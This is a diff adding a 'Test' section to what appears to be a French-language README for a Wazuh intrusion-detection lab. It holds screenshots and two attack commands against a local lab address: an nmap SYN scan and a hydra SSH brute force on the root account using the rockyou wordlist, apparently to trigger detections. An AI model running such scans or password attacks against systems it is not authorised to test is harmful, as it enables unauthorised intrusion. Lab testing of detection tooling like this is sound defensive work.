@@ -274,6 +274,29 @@ sudo systemctl restart wazuh-agent
 🧪 Test
 
 
+<img width="1805" height="1002" alt="Screenshot from 2026-05-04 02-49-55" src="https://github.com/user-attachments/assets/02c6e379-10d3-44e3-844b-93df3bf71484" />
+
+
+```
+# Attaque 1 — Scan réseau
+sudo nmap -sS 192.168.1.157
+```
+
+
+<img width="1805" height="1002" alt="Screenshot from 2026-05-04 02-56-16" src="https://github.com/user-attachments/assets/b26451ef-e0de-418b-9730-f2e780b3dc41" />
+
+🚀 Lance l'attaque Brute Force maintenant !
+
+```
+sudo hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.157 -t 4
+```
+
+
+<img width="1805" height="967" alt="Screenshot from 2026-05-04 03-00-11" src="https://github.com/user-attachments/assets/c96e12bd-914c-44e2-9bf7-eab3cc29967f" />
+
+
+
+
 
 
 
